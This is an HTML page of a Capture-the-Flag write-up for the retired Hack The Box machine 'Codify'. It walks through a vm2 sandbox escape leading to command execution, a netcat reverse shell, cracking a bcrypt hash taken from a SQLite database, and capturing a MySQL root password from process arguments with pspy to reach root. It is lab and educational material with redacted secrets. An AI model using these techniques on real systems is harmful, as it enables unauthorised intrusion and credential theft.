@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Codify &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Codify</h1>
+    
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Nodejs</span><span class="tag">vm2</span><span class="tag">sandbox</span><span class="tag">SQLite</span><span class="tag">john</span><span class="tag">credentialhunting</span><span class="tag">sudo</span><span class="tag">pspy</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#vm2-sandbox-escape">vm2 Sandbox Escape</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#sqlite-hash-joshua-over-ssh">SQLite Hash → joshua over SSH</a><a class="lvl3" href="#sudo-backup-script-leaking-the-password-via-pspy">sudo Backup Script, Leaking the Password via pspy</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Codify is an easy Linux box centered on a sandbox escape. The site runs a Node.js code playground built on the <strong>vm2</strong> library, which has a long history of escapes, I use one to break out and execute commands as <code>svc</code>. From there a SQLite database yields a bcrypt hash that cracks to an SSH user, and root falls to a <code>sudo</code>-runnable backup script that leaks the MySQL root password to any process watcher.</p>
+<h2 id="recon">Recon</h2>
+<p>The app on ports 80/3000 is a JavaScript runner that advertises it sandboxes code with <strong>vm2</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="vm2-sandbox-escape">vm2 Sandbox Escape</h3>
+<blockquote>
+<p><strong>Why vm2 keeps getting escaped:</strong> vm2 tries to run untrusted JavaScript safely by proxying access to host objects. But JavaScript's reflection is deep, error stack traces, proxies, and constructor chains repeatedly expose a path back to the real <code>process</code> object. Once you reach <code>process.mainModule.require</code>, you can pull in <code>child_process</code> and run OS commands. This PoC abuses a <code>getPrototypeOf</code> proxy handler during error handling to grab the host constructor.</p>
+</blockquote>
+<pre><code class="language-js">const { VM } = require(&quot;vm2&quot;);
+// ... proxy/error trick ...
+const childProcess = c.constructor('return process')().mainModule.require('child_process');
+childProcess.execSync('whoami');   // -&gt; svc
+</code></pre>
+<p>Using that primitive one command at a time, I pulled my own <code>nc</code> binary onto the host, made it executable, and ran it for a full shell:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+whoami
+svc
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sqlite-hash-joshua-over-ssh">SQLite Hash → joshua over SSH</h3>
+<p>A non-public part of the app lived in <code>/var/www/contact</code>, including <code>tickets.db</code>. Dumping its users table gave a bcrypt hash:</p>
+<pre><code class="language-sh">sqlite3 tickets.db
+sqlite&gt; select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+</code></pre>
+<p>John cracked it, and the password worked for SSH as <code>joshua</code>:</p>
+<pre><code class="language-sh">john hash --wordlist=rockyou.txt   -&gt;   ‹redacted›
+ssh joshua@codify.htb
+</code></pre>
+<h3 id="sudo-backup-script-leaking-the-password-via-pspy">sudo Backup Script, Leaking the Password via pspy</h3>
+<pre><code class="language-sh">sudo -l
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+</code></pre>
+<p>Reading the script revealed how it handles the DB password:</p>
+<p>```‹redacted›
+read -s -p "‹redacted› MySQL password for $DB_USER: " USER_PASS</p>
+<h1>... mysql -u root -p<password from file> ...</h1>
+<pre><code>
+&gt; **The flaw:** the script reads a password and runs `mysql`/`mysqldump` by passing the *real* root password on the command line. Command lines are visible to every user via `/proc`. So even though the prompt hides my input, the actual root DB password appears in the process arguments each time the script runs, and `pspy` (which polls `/proc` for new processes) captures it.
+
+</code></pre>
+<p>CMD: UID=0  /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -p‹redacted› -e SHOW DATABASES;</p>
+<pre><code>
+That MySQL root password was reused by the system root account:
+
+```sh
+su root
+root@codify:/tmp# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>vm2 is not a security boundary.</strong> Treat any "we sandbox your JS with vm2" feature as RCE waiting to happen.</li>
+<li><strong>Hunt for SQLite databases in app directories</strong>, <code>tickets.db</code> carried the hash that bridged to SSH.</li>
+<li><strong>Secrets on the command line leak via <code>/proc</code>.</strong> A root cron/script that passes a password as a CLI argument can be harvested with <code>pspy</code>, no exploit required.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
